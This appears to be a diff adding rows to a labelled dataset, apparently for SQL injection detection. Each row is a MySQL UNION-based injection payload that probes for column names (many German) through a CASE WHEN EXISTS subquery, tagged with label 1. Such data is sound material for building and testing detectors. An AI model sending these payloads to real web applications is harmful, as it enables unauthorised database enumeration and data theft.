+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT speise_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- tiHC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT word_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rspj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT absatz_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IeNe",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT class_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zCyc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mail_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VWfU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT zid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lQPq",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ticket_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XByg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT queue_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EFdk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pid1 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yMCJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pid2 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aDXD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT currval FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EvwS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT forum FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WeXg",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT organizationid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NtjA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT institute_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gYfZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT history_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nHyo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT my FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qaMs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT how FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZEAf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT after FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cOzx",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT meetingid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oZFP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mitarbeiterid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SzNI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idgruppe FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DqCJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT re FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vAOS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT artikel_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HjoW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT top FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KHEU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT perid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mLKC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pers_nr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Cxma",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idstelle FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Lfne",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT messageid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YKpi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT acctid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oPQW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT address_book_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ymOw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT article_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gRwu",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT com FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pamD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RpIb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT rule_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WpPf",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT kosten FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Gpjy",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT plz FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HXQs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT confirm_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MYiC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT race_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eyfL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vis_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cQjZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT descr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fLJA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT seitelayout_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hZrk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vote_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DVTn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT g_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GhvC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT activated FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- weCA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `show` FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WOwK",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT guy FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WhHj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT vtyp_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MBEd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT timeofmove FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rxDj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT views FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Zhmk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT meta_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WpYO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT blz FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bfdi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bookid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gNWa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT teilnehmernr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UojS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT weaponid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MWkZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT region_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WcGw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT resultid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Xjaa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT calendar FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yvEG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT address_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zmep",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pos FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OMmA",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT d_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rSzs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT serverid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vezQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cd FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BryM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT answer_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fzJb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT categories_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- exbZ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT start FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XHet",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT site_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KZRx",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT price_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KEAV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT az FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- txlw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mnr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- lUDJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cis_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Lovb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT config_key FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HxBJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT address_format_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JuXJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tn FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UUOl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tax_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- FmhM",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mountname FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xcyS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT standard FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rOtF",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT schweiz FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IaAb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT partner_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IAIo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT idkontakt FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JFtk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT eventid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hJhI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT oldstate FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xksG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT topicid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kCsI",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sonst FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PKON",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pk FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kyZO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mountcategory FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mWSo",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT von FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KdfW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT orders_recalculate_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cokB",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT knr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aMBW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT msgid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ofZd",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ortnr FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XYpT",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT seiteabs_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EIHY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id1 FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vrnk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT um FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oLaH",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT paperid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pvuJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT send FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jOoe",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT wid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZVJX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gi FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GgLG",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lieferant FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KAtb",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT orgid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pOhi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT profile FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HaXC",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT zugang FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HMGW",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT allow FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- kPOn",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT unique_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- JfjX",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT taskid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- iWVJ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT configuration_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qEZP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT jcode FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Uxqk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ex_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- opxe",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT blog_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Yvff",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT who FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pARV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT section_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OSER",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mindk FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mBUe",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT beschreibung FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cavP",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT schl FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hsbs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT you FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- szEw",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT object_link_a_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MhoL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT disallow_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Ivss",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT strasse FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OCWk",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT option_name FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WcpO",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT q_trid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AhVL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT summary_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DoWQ",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT gameid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hRxU",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT catid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NssE",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dni FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZiBm",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT prune_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DCQL",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT anid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Kjrs",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT linkid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XycV",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT qid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dVCi",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT word_text FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IuTh",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_cat FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YPHY",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT eid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wNNl",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT privmsgs_text_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- MSJa",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT downloadid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oxkS",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT hid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fdEv",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT themes_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dHMc",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT privmsgs_id FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nxuj",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT codi FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- xPdD",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT requestid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dLCx",1
+"1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ratingdbid FROM performance_schema.socket_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- RNmj",1
